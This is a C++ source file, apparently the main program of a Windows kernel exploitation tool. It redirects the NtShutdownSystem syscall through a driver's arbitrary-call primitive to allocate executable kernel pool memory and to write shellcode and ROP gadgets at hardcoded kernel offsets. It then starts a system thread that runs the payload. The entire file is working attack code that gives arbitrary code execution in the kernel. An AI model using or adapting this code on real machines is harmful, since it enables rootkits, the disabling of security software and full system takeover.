#include <include/driver/arbitrary_call.hpp>
#include <include/utils/utils.hpp>
#include <iostream>

int main()
{
    if (!Utils::EnableDebugPrivilege())
    {
        std::exception("Failed to enable debug privileges");
        return EXIT_FAILURE;
    }

    Driver::ArbitraryCaller KernelCaller = Driver::ArbitraryCaller();

    const void* NtShutdownSystem = GetProcAddress(LoadLibraryA("ntdll.dll"), "NtShutdownSystem");

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ExAllocatePool2");
    void* ShellcodeAllocation = reinterpret_cast<void*(*)(std::uint32_t, std::size_t, std::uint32_t)>(NtShutdownSystem)(0x80, 0x100, 'Thre');
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Shellcode @ 0x%p\n", ShellcodeAllocation);

    if (!ShellcodeAllocation)
        return EXIT_FAILURE;

    KernelCaller.RedirectCallByName("NtShutdownSystem", "ExAllocatePool2");
    void* StackAllocation = reinterpret_cast<void* (*)(std::uint32_t, std::size_t, std::uint32_t)>(NtShutdownSystem)(0x40 | 0x2, 0x3000, 'Thre');
    KernelCaller.DisableRedirectByName("NtShutdownSystem");
    std::printf("[+] Stack @ 0x%p\n", StackAllocation);

    if (!StackAllocation)
        return EXIT_FAILURE;
    
    // Write shellcode
    std::uint8_t ShellcodeTemplate[] =
    {
        0x48, 0xBD, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, // mov rbp, StackAllocation
        0x48, 0xBB, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF, 0xBE, 0xAD, 0xDE, // mov rbx, leave; ret; gadget
        0x53,                                                       // push rbx
        0xC3                                                        // ret
    };

    *(void**)(ShellcodeTemplate + 2) = StackAllocation;
    *(void**)(ShellcodeTemplate + 12) = (void*)(Driver::GetKernelModuleBase() + 0x3890c4);

    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void*(*)(void*, void*, size_t)>(NtShutdownSystem)(ShellcodeAllocation, &ShellcodeTemplate, sizeof(ShellcodeTemplate));
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    // Write rop gadgets
    void* RopGadgetTest = (void*)(Driver::GetKernelModuleBase() + 0x3357b3); // nop; ret; gadget
    KernelCaller.RedirectCallByName("NtShutdownSystem", "memcpy");
    reinterpret_cast<void* (*)(void*, void*, size_t)>(NtShutdownSystem)(StackAllocation, &RopGadgetTest, sizeof(void*));
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    std::printf("[+] Rop gadget @ 0x%p\n", RopGadgetTest);

    Sleep(500);
    std::cin.get();

    HANDLE KernelThreadHandle;
    KernelCaller.RedirectCallByName("NtShutdownSystem", "PsCreateSystemThread", (void*)NULL, (void*)ShellcodeAllocation, (void*)NULL);
    NTSTATUS ThreadCreation = reinterpret_cast<NTSTATUS(*)(PHANDLE, ULONG, POBJECT_ATTRIBUTES, HANDLE)>(NtShutdownSystem)(
        &KernelThreadHandle,
        THREAD_ALL_ACCESS,
        NULL,
        NULL
    );
    KernelCaller.DisableRedirectByName("NtShutdownSystem");

    return EXIT_SUCCESS;
}